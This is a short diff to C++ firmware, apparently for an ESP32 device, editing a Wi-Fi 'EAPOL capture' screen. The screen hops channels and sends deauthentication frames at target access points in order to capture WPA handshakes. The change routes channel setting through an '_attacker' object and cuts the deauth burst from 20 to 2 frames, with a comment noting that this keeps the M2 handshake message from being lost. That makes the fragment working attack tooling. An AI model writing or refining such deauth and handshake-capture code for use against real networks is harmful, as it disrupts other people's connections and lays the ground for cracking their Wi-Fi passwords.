@@ -152,7 +152,7 @@ void WifiEapolCaptureScreen::onUpdate() {
   if (_phase == PHASE_DISCOVERY) {
     if (now >= _chanDwellUntil) {
       _channel = (_channel % 13) + 1;
-      esp_wifi_set_channel(_channel, WIFI_SECOND_CHAN_NONE);
+      _attacker->setChannel(_channel);
       _discoveryCount++;
 
       char buf[44];
@@ -308,7 +308,7 @@ void WifiEapolCaptureScreen::_buildAttackChans() {
 // Hop to the current attack channel and arm timing/flags.
 void WifiEapolCaptureScreen::_hopToAttackChan() {
   _channel     = _attackChans[_attackChanIdx];
-  esp_wifi_set_channel(_channel, WIFI_SECOND_CHAN_NONE);
+  _attacker->setChannel(_channel);
   _deauthFired    = false;
   _midDeauthSent  = false;
   _chanDwellUntil = millis() + ATTACK_DWELL_MS;
@@ -347,7 +347,8 @@ void WifiEapolCaptureScreen::_sendDeauth(int ch) {
     if (it != _eapolMap.end() && it->second.hasM1 && it->second.hasM2) continue;
     if (_apTargets[i].deauthCount >= MAX_DEAUTH_ATTEMPTS) continue;
 
-    for (int b = 0; b < 20; b++) {
+    // Light burst — heavier TX blocks promiscuous RX and loses M2
+    for (int b = 0; b < 2; b++) {
       _attacker->deauthenticate(_apTargets[i].bssid, (uint8_t)ch);
     }
     _apTargets[i].deauthCount++;
